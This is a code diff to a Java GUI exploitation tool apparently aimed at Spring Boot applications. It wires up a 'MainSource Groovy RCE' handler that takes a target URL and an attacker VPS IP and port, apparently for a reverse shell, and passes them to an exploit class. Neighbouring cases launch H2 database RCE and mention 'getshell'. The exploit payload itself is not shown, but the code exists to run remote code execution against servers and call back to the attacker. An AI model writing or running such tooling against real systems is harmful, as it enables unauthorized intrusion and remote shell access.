@@ -567,8 +567,39 @@ public class springboot_vul extends Application {
         public void handlerLoggingGroovyRCE(String address,String command){
 
         }
-        public void handlerMainSourceGroovyRCE(String address,String command){
+        public void handlerMainSourceGroovyRCE(String address,String vpsIP,String vpsPORT){
+                consoleOutput.getChildren().clear();
+                if (address.isEmpty()){
+                        showAlertEmpty("地址为空！");
+                }else {
+                        if (address.endsWith("/")) {
+                                address = address.replaceAll("/$", "");
+                        }
+                        if (!address.startsWith("http://") && !address.startsWith("https://")) {
+                                address = "http://" + address;
+                        }
+                        if (vpsIP.isEmpty() && vpsPORT.isEmpty()) {
+                                showAlertEmpty("反弹vps的IP和端口为空！");
+                        } else {
+                                MainSourceGrooyRCE mr = new MainSourceGrooyRCE(address,vpsIP,vpsPORT);
+                                mr.Exp(new ResultCallback() {
+                                        @Override
+                                        public void onResult(String result) {
+                                                Platform.runLater(() -> {
+                                                        // 输出其他内容到控制台
+                                                        Text text = new Text(result + "\n");
+                                                        consoleOutput.getChildren().add(text);
+                                                        // 自动滚动到最新内容
+                                                        scrollPane.setVvalue(1.0);
+                                                });
+                                        }
 
+                                        @Override
+                                        public void onComplete() {
+                                        }
+                                });
+                        }
+                }
         }
         public void handlerH2DatabaseDatasourceRCE(String address,String vpsIP,String vpsPORT){
                 // 清空控制台输出
@@ -698,7 +729,7 @@ public class springboot_vul extends Application {
                                         handlerLoggingGroovyRCE(address, command);
                                         break;
                                 case 16:
-                                        handlerMainSourceGroovyRCE(address, command);
+                                        handlerMainSourceGroovyRCE(address,vpsIP,vpsPort);
                                         break;
                                 case 17:
                                         handlerH2DatabaseDatasourceRCE(address, vpsIP, vpsPort);
@@ -779,7 +810,7 @@ public class springboot_vul extends Application {
                                         handlerLoggingGroovyRCE(address, command);
                                         break;
                                 case 16:
-                                        handlerMainSourceGroovyRCE(address, command);
+                                        handlerMainSourceGroovyRCE(address,vpsIP,vpsPort);
                                         break;
                                 case 17:
                                         showAlertEmpty("暂时没有写这里，直接getshell");
